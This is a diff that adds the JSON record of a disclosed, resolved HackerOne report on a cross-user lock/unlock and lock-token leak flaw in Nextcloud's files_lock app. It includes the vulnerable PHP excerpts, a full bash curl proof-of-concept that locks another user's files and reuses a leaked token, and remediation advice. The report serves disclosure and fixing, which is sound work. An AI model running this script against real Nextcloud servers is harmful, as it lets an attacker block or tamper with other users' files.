@@ -1,0 +1,161 @@
+{
+  "id": 3301553,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzAxNTUz",
+  "url": "https://hackerone.com/reports/3301553",
+  "title": "Cross-User Lock/Unlock via Absolute DAV Path",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2025-08-16T06:04:54.343Z",
+  "submitted_at": "2025-08-16T06:04:54.644Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0x0doteth",
+    "url": "/0x0doteth",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/a0tkwftcyez2efkjdv2mj9y605dw/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-45283"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-17T13:09:01.769Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-17T13:09:01.537Z",
+  "team_member_agreed_on_going_public_at": "2026-09-17T10:29:37.631Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nAny authenticated user can lock or unlock files they do not own by targeting absolute WebDAV paths of other users. The DAV plugin resolves files from the absolute request URI without verifying that the `<userId>` path segment matches the authenticated session user. This enables:\n\n- Cross-user manual locks : attacker locks a victim's files, blocking writes (PUT/MOVE/DELETE, editor saves).\n- Lock-token disclosure: the app returns the lock token to unauthorized callers, enabling them to remove token-based locks (client locks) of other users.\n\nThis is exploitable in default Docker dev setups and standard deployments where the `files_lock` app is enabled.\n\n\n\n## Affected components and vulnerable code\n\n1) DAV plugin resolves from absolute path without verifying path user vs session user, enabling cross-user targetting.\n\n(https://github.com/nextcloud/files_lock/blob/ba6291713edd67d7bc054c8d562b5ee183f3afdf/lib/DAV/LockPlugin.php#L186)\n\n```186:196:lib/DAV/LockPlugin.php\npublic function httpLock(RequestInterface $request, ResponseInterface $response) {\n    if ($request->getHeader('X-User-Lock')) {\n        $lockType = (int)($request->getHeader('X-User-Lock-Type') ?? ILock::TYPE_USER);\n        $response->setHeader('Content-Type', 'application/xml; charset=utf-8');\n\n        $file = $this->fileService->getFileFromAbsoluteUri($this->server->getRequestUri());\n```\n(https://github.com/nextcloud/files_lock/blob/ba6291713edd67d7bc054c8d562b5ee183f3afdf/lib/DAV/LockPlugin.php#L220)\n```220:231:lib/DAV/LockPlugin.php\npublic function httpUnlock(RequestInterface $request, ResponseInterface $response) {\n    if ($request->getHeader('X-User-Lock')) {\n        $lockType = (int)($request->getHeader('X-User-Lock-Type') ?? ILock::TYPE_USER);\n        $response->setHeader('Content-Type', 'application/xml; charset=utf-8');\n\n        $file = $this->fileService->getFileFromAbsoluteUri($this->server->getRequestUri());\n```\n\n2) Absolute resolver trusts path `<userId>` and does not verify against session.\n(https://github.com/nextcloud/files_lock/blob/ba6291713edd67d7bc054c8d562b5ee183f3afdf/lib/Service/FileService.php#L110)\n\n```110:120:lib/Service/FileService.php\npublic function getFileFromAbsoluteUri(string $uri): Node {\n    [$root, $userId, $path] = explode('/', trim($uri, '/') . '/', 3);\n    if ($root !== 'files') {\n        throw new NotFoundException();\n    }\n    $path = '/' . $path;\n    $file = $this->rootFolder->getUserFolder($userId)\n        ->get($path);\n    return $file;\n}\n```\n\n3) Backend may also use absolute resolution depending on server tree.\n(https://github.com/nextcloud/files_lock/blob/ba6291713edd67d7bc054c8d562b5ee183f3afdf/lib/DAV/LockBackend.php#L115)\n```115:121:lib/DAV/LockBackend.php\nprivate function getFileFromUri(string $uri): Node {\n    if ($this->absolute) {\n        return $this->fileService->getFileFromAbsoluteUri($uri);\n    }\n    return $this->fileService->getFileFromUri($uri);\n}\n```\n\n4) Lock token disclosure to unauthorized callers.\n\n(https://github.com/nextcloud/files_lock/blob/ba6291713edd67d7bc054c8d562b5ee183f3afdf/lib/DAV/LockPlugin.php#L247)\n\n```247:255:lib/DAV/LockPlugin.php\n} catch (UnauthorizedUnlockException $e) {\n    $lock = $this->lockService->getLockFromFileId($file->getId());\n    $response->setStatus(Http::STATUS_LOCKED);\n    $response->setBody(\n        $this->server->xml->write(\n            '{DAV:}prop',\n            $this->getLockProperties($lock, $file)\n        )\n    );\n}\n```\n(https://github.com/nextcloud/files_lock/blob/ba6291713edd67d7bc054c8d562b5ee183f3afdf/lib/DAV/LockPlugin.php#L269)\n\n```269:283:lib/DAV/LockPlugin.php\nprivate function getLockProperties(?FileLock $lock, Node $file): array {\n    // ...\n    return [\n        // ...\n        Application::DAV_PROPERTY_LOCK_TOKEN => $lock ? $lock->getToken() : null,\n    ];\n}\n```\n\nAdditionally, the OCS controller returns the token in 423 responses:\n(https://github.com/nextcloud/files_lock/blob/ba6291713edd67d7bc054c8d562b5ee183f3afdf/lib/Controller/LockController.php#L108)\n\n```108:113:lib/Controller/LockController.php\n} catch (UnauthorizedUnlockException $e) {\n    $lock = $this->lockService->getLockFromFileId((int)$fileId);\n    $response = new DataResponse();\n    $response->setStatus(Http::STATUS_LOCKED);\n    $response->setData($lock->jsonSerialize());\n    return $response;\n}\n```\n\n## POC\n\nPrerequisites:\n- Nextcloud instance with `files_lock` enabled.\n- Two valid users (victim `alice` and attacker `admin` below). Any authenticated user works; admin is not required.\n\nMy POC will do two exploits\n\nExploit A: Cross-user lock DoS (attacker locks Alice’s file)\n\n\nExploit B: Token leak + unauthorized unlock\n\n```\n\n#!/usr/bin/env bash\n\n# PoC script for Nextcloud files_lock vulnerabilities\n# - Exploit A: Cross-user manual lock DoS via absolute DAV path\n# - Exploit B: Lock token leak to unauthorized caller + unauthorized unlock\n\n# Config (override via env before running)\n: \"${BASE_URL:=http://localhost:8080}\"\n: \"${ALICE_USER:=alice}\"\n: \"${ALICE_PASS:=AlicePass123!}\"\n: \"${ATTACKER_USER:=admin}\"\n: \"${ATTACKER_PASS:=admin}\"\n\nset -u\nset -o pipefail\n\nlog() {\n  printf \"\\n==> %s\\n\" \"$*\"\n}\n\nrequire_cmd() {\n  command -v \"$1\" >/dev/null 2>&1 || { echo \"Missing required command: $1\"; exit 1; }\n}\n\nrequire_cmd curl\nrequire_cmd sed\nrequire_cmd grep\nrequire_cmd date\n\n# Create unique file names per run\nTS=\"$(date +%s)\"\nRAND=\"${RANDOM:-0}\"\nFILE_A=\"pocA_${TS}_${RAND}.txt\"\nFILE_B=\"pocB_${TS}_${RAND}.txt\"\n\nALICE_DAV_A=\"${BASE_URL}/remote.php/dav/files/${ALICE_USER}/${FILE_A}\"\nALICE_DAV_B=\"${BASE_URL}/remote.php/dav/files/${ALICE_USER}/${FILE_B}\"\n\nlog \"Using BASE_URL=${BASE_URL}\"\nlog \"Victim user: ${ALICE_USER} | Attacker user: ${ATTACKER_USER}\"\n\nupload_file_as_alice() {\n  local url=\"$1\"; local content=\"$2\"\n  log \"Uploading victim file as ${ALICE_USER}: ${url}\"\n  printf '%s\\n' \"${content}\" | curl -s -i -u \"${ALICE_USER}:${ALICE_PASS}\" -T - \"$url\" | tee /tmp/poc_upload.out >/dev/null\n  grep -E '^HTTP/1\\.[01] ' /tmp/poc_upload.out | tail -n1\n}\n\nexploit_a() {\n  log \"Exploit A: Cross-user lock DoS by ${ATTACKER_USER} on ${ALICE_USER}'s file\"\n  log \"Attacker LOCK with X-User-Lock on ${ALICE_DAV_A}\"\n  curl -s -i -u \"${ATTACKER_USER}:${ATTACKER_PASS}\" -X LOCK -H 'X-User-Lock: 1' \"${ALICE_DAV_A}\" | tee /tmp/pocA_lock.out >/dev/null\n  grep -E '^HTTP/1\\.[01] ' /tmp/pocA_lock.out | tail -n1\n  echo \"Lock owner:\" $(grep -oE '<nc:lock-owner>[^<]+' /tmp/pocA_lock.out | sed 's/.*>//' | head -n1)\n\n  log \"Alice attempts to modify (expected 423 Locked)\"\n  curl -s -i -u \"${ALICE_USER}:${ALICE_PASS}\" -X PUT --data-binary 'new content' \"${ALICE_DAV_A}\" | tee /tmp/pocA_put.out >/dev/null\n  grep -E '^HTTP/1\\.[01] ' /tmp/pocA_put.out | tail -n1\n}\n\nexploit_b() {\n  log \"Exploit B: Token leak + unauthorized unlock on fresh file\"\n  log \"Ensure no manual lock exists (best-effort unlock by attacker)\"\n  curl -s -i -u \"${ATTACKER_USER}:${ATTACKER_PASS}\" -X UNLOCK -H 'X-User-Lock: 1' \"${ALICE_DAV_B}\" | tee /tmp/pocB_cleanup.out >/dev/null\n  grep -E '^HTTP/1\\.[01] ' /tmp/pocB_cleanup.out | tail -n1 || true\n\n  log \"Alice creates a token-based LOCK\"\n  cat > /tmp/lockinfo.xml <<'XML'\n<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<D:lockinfo xmlns:D=\"DAV:\">\n  <D:lockscope><D:exclusive/></D:lockscope>\n  <D:locktype><D:write/></D:locktype>\n  <D:owner>alice-client</D:owner>\n</D:lockinfo>\nXML\n  curl -s -i -u \"${ALICE_USER}:${ALICE_PASS}\" -X LOCK -H 'Content-Type: application/xml' --data-binary @/tmp/lockinfo.xml \"${ALICE_DAV_B}\" | tee /tmp/pocB_lock_alice.out >/dev/null\n  grep -E '^HTTP/1\\.[01] ' /tmp/pocB_lock_alice.out | tail -n1\n  echo \"Lock-Token header (from Alice response):\" $(grep -i '^Lock-Token:' /tmp/pocB_lock_alice.out | sed 's/Lock-Token:[[:space:]]*//I' | tr -d '\\r')\n\n  log \"Attacker sends UNLOCK with X-User-Lock to leak token (expected 423 with token in XML body)\"\n  curl -s -i -u \"${ATTACKER_USER}:${ATTACKER_PASS}\" -X UNLOCK -H 'X-User-Lock: 1' \"${ALICE_DAV_B}\" | tee /tmp/pocB_leak.out >/dev/null\n  grep -E '^HTTP/1\\.[01] ' /tmp/pocB_leak.out | tail -n1\n  LEAKED_TOKEN=$(grep -oE '<nc:lock-token>[^<]+' /tmp/pocB_leak.out | sed 's/.*>//' | head -n1 || true)\n  if [[ -z \"${LEAKED_TOKEN}\" ]]; then\n    echo \"[!] Failed to parse leaked token from body; showing response snippet:\" \n    sed -n '1,120p' /tmp/pocB_leak.out\n    exit 1\n  fi\n  echo \"Leaked token:\" \"${LEAKED_TOKEN}\"\n\n  log \"Attacker unlocks with leaked token (expected 204 No Content)\"\n  curl -s -i -u \"${ATTACKER_USER}:${ATTACKER_PASS}\" -X UNLOCK -H \"Lock-Token: <opaquelocktoken:${LEAKED_TOKEN}>\" \"${ALICE_DAV_B}\" | tee /tmp/pocB_unlock.out >/dev/null\n  grep -E '^HTTP/1\\.[01] ' /tmp/pocB_unlock.out | tail -n1\n\n  log \"Alice modifies file after attacker unlock (expected 204)\"\n  curl -s -i -u \"${ALICE_USER}:${ALICE_PASS}\" -X PUT --data-binary 'after unlock' \"${ALICE_DAV_B}\" | tee /tmp/pocB_put.out >/dev/null\n  grep -E '^HTTP/1\\.[01] ' /tmp/pocB_put.out | tail -n1\n}\n\nverify_notes() {\n  printf \"\\nVerification:\\n\"\n  printf \"- Exploit A: You should see 200 on attacker LOCK and 423 on Alice PUT.\\n\"\n  printf \"  File: %s\\n\" \"${ALICE_DAV_A}\"\n  printf \"- Exploit B: You should see 423 (with <nc:lock-token>…) then 204 on attacker UNLOCK, then 204 on Alice PUT.\\n\"\n  printf \"  File: %s\\n\" \"${ALICE_DAV_B}\"\n  printf \"\\nYou can also open the Files app as Alice and confirm lock icons/ability to edit these files.\\n\"\n}\n\n# Run\nupload_file_as_alice \"${ALICE_DAV_A}\" \"hello from PoC A\"\nexploit_a\n\nupload_file_as_alice \"${ALICE_DAV_B}\" \"hello from PoC B\"\nexploit_b\n\nverify_notes\n\n\n\n```\n\n\n## Steps to reproduce \n\n1) Nextcloud installed\n2) Enable the app: `docker exec -u www-data nextcloud php occ app:enable files_lock`.\n3) Create users (e.g., `alice`, `admin`).\n4) Run the script.\n5) Verify the demonstration visiting alice account and see the lock icon on file and open it and try to write somethng it , you won't because it is locked by attacker.\n\n\n\n## What’s happening under the hood\n\n- The DAV plugin calls `getFileFromAbsoluteUri($requestUri)` which parses `/remote.php/dav/files/<userId>/<path>` and directly opens `<userId>`’s folder, ignoring the authenticated session user.\n- Therefore a logged-in user can operate on `/files/alice/...` while authenticated as `bob/admin`, applying user-locks to Alice’s files.\n- On unauthorized unlock attempts, the app constructs and returns lock properties including the `lock-token`, leaking it to the attacker, who can then send a standard `UNLOCK` with that token to clear the lock.\n\n## Prerequisites for exploitation\n\n- Attacker has any valid Nextcloud account (no admin required).\n- Attacker can reach the DAV endpoint (default `/remote.php/dav`).\n- Attacker can guess or observe a victim username and file path. In practice user IDs and paths are often predictable or discoverable.\n\n## Recommended remediation\n\n1) Enforce user scoping in DAV handlers:\n   - In `lib/DAV/LockPlugin.php` `httpLock/httpUnlock`, do not use `getFileFromAbsoluteUri` blindly. Either:\n     - Resolve nodes in the context of the session user, or\n     - Parse the path `<userId>` and verify it equals `IUserSession->getUser()->getUID()`. If mismatch, return 403/404.\n\n2) Harden `getFileFromAbsoluteUri`:\n   - Verify the extracted `<userId>` equals the current session user and/or perform proper permission checks. Reject otherwise.\n\n3) Do not disclose lock tokens to unauthorized callers:\n   - Remove token from `getLockProperties()` and OCS `unlocking()` responses unless the caller is authorized.\n\n## Impact\n\n- Any user on a multi-tenant Nextcloud can cause widespread write-denial by locking other users’ files at will (single request per file), disrupting collaboration and automation (desktop/mobile clients, online editors, CI pipelines writing into user folders).\n- The lock token (credential-like secret) for token-based client locks is exposed to unauthorized users, allowing them to remove locks placed by client apps, increasing friction and risking data loss due to concurrent edits.\n- No social engineering, special setup, or elevated privileges are required beyond having an account and guessing/knowing the victim username and a path.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4684374,
+      "file_name": "Screen_Recording_2025-08-16_at_11.32.39_AM.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wt62o36uewrmhraj4cav8lzd87j6?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2025-08-16_at_11.32.39_AM.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2025-08-16_at_11.32.39_AM.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUA6UE4Y%2F20260917%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260917T172731Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGUaCXVzLXdlc3QtMiJHMEUCIQClp%2FWlkoUiz5dsORDN3uq5U8hb1ndyQIaCKi0ZeSUeCQIgQ%2FER2VL6lSJv9Rz1AtEno2zYWHnkgNzbU%2BBFOpj75hUqsQUILhADGgwwMTM2MTkyNzQ4NDkiDE7%2FtBpi4JGkNTaGwCqOBerkoyjKrR7J5Hg%2BcxaP30CfCp9ohZOXAuZnFQP84lAWqBI7EEprGmyu0n9%2B3n5cHDzdjP%2FNeSO0Q11zclOlnzKvo%2FQ8PByrk1RiH%2FD29Ymz6nWMkC1o22dIjxgkZAgc9q5cOY6z2RujC238gTs4FnTPng2jgF9pOYDcprHguZukjX%2Bc2YC9933XIcC%2F7A7rncmREem77UjzmWRwUDfcFs59xItvJ6%2B75E7qwWaEEedkU9x6djUY9UpGpGvfioWen5VRC7BJFQZgLIDb%2B6zEGXLRT1ux1jpBT9PnfDgiAYl4LC9q28tHmxrIx1RnfVKTOXaCIHrQqDknEq%2BF2UzpxoGuU4WY2g5D8Tazqn6X0zg6yHMxqAWZVtalCZhSsi0hFhZl%2FaWfp6X1ICouCy3DC01G3GMbuM0DVESK32aLGLJn3dsz5vg1V%2BF9EEo%2B3DW69dp1FxPwDnNSYlvy1dcqZRnESnyxudZwEYZqu8KC2%2Ffk2jBJ2c%2F7Wxeyj4LsfnVzD%2FMKRdHfkJPnUkmTQpq9pMtv5K0MvfaTtQC%2BwitkBQmcM8h%2F1Hs1QfKoQr7wDYkpURM2KFlALhTeNrVOgS33EgxzritEslv%2BJ4w88nsUfoTMi8l2cg6uGd8KZdj8LSs9gSi2imjXu2WtFvnNUU48uZWwJ15oy%2FtDmnxeAIvk2R%2BGRPrjmvOrMsA4BakpFQLLcxufNmYOQATS8sJZr7SAseH1issqcpZ5udb9bJLUzM1sbPWSVkStjLBrFMgp13bEct5PyBZchX7Pjml5wgDj%2FuiBuzk2BaK%2B7X6bzK5EuRdZh5I%2BTf%2Ft0IRM58GoAtrtiz8o9cUmsra%2BohtywCM3h0T971jMjjGvNDoOTniMwzCAy6%2FVBjqxAQzE1Hb%2FoPBr7RKwwiC3aeBujWAby3klaG3Ux0IdlGlYwrBZdbnapq5bZOXv4sztMauWIdyk4lpvRdEU1GU%2FFMJyWpTbcgv4HDsjccm6cXrzbKUBDwFOO2PNagFLE%2BUY5ck%2FaddYPJ89g%2BVQZ7domOYSLZQspcc8tlLEbZTlefwbieDHaau%2ByrIHX7WIFGkO56KSQqsN86ZtmaBdiT3WJXdMtorZh%2FqIlKyaRGbH8LAupg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3d06224bf5d3a7ef267b38f26efd27717625f59f7f086ff705e59ed3bbc0b038",
+      "file_size": 27684716,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-10-17T10:29:37.946Z",
+  "allow_singular_disclosure_after": 2566926.644410824,
+  "singular_disclosure_allowed": false,
+  "vote_count": 1,
+  "voters": [
+    "zy9ard3"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 222965,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/files_lock",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 880374,
+      "category": "team",
+      "content": "https://github.com/nextcloud/security-advisories/security/advisories/GHSA-783r-vj89-5x2q",
+      "updated_at": "2026-07-25T13:21:51.045Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 3154452,
+        "username": "djdisco",
+        "name": "DJDisco__Nextcloud",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2024-03-21T14:45:18.271Z",
+        "url": "https://hackerone.com/djdisco",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
